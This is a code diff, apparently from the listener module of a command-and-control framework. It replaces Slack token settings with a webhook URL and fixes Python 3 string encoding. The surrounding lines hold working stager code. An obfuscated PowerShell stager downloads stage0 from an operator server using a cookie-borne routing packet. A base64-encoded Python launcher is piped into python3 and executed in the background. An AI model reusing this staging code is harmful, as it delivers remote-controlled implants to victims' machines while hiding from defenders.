@@ -86,15 +86,10 @@ class Listener(object):
                 'Required'      :   False,
                 'Value'         :   ''
             },
-            'SlackToken' : {
-                'Description'   :   'Your SlackBot API token to communicate with your Slack instance.',
+            'SlackURL' : {
+                'Description'   :   'Your Slack Incoming Webhook URL to communicate with your Slack instance.',
                 'Required'      :   False,
                 'Value'         :   ''
-            },
-            'SlackChannel' : {
-                'Description'   :   'The Slack channel or DM that notifications will be sent to.',
-                'Required'      :   False,
-                'Value'         :   '#general'
             }
         }
 
@@ -232,7 +227,7 @@ class Listener(object):
 
                 # add the RC4 packet to a cookie
                 stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+".Headers.Add(")
-                stager += "\"Cookie\",\"session=%s\");" % (b64RoutingPacket)
+                stager += "\"Cookie\",\"session=%s\");" % (b64RoutingPacket.decode('UTF-8'))
 
                 stager += "$ser=" + helpers.obfuscate_call_home_address(host) + ";$t='" + stage0 + "';"
                 stager += helpers.randomize_capitalization("$data=$"+helpers.generate_random_script_var_name("wc")+".DownloadData($ser+$t);")
@@ -281,7 +276,7 @@ class Listener(object):
 
                 # prebuild the request routing packet for the launcher
                 routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='POWERSHELL', meta='STAGE0', additional='None', encData='')
-                b64RoutingPacket = base64.b64encode(routingPacket)
+                b64RoutingPacket = base64.b64encode(routingPacket).decode('UTF-8')
 
                 # add the RC4 packet to a cookie
                 launcherBase += "o.addheaders=[('User-Agent',UA), (\"Cookie\", \"session=%s\")];\n" % (b64RoutingPacket)
@@ -330,7 +325,9 @@ class Listener(object):
                 launcherBase += "exec(''.join(out))"
 
                 if encode:
-                    launchEncoded = base64.b64encode(launcherBase)
+                    launchEncoded = base64.b64encode(launcherBase.encode('UTF-8')).decode('UTF-8')
+                    if isinstance(launchEncoded, bytes):
+                        launchEncoded = launchEncoded.decode('UTF-8')
                     launcher = "echo \"import sys,base64;exec(base64.b64decode('%s'));\" | python3 &" % (launchEncoded)
                     return launcher
                 else:
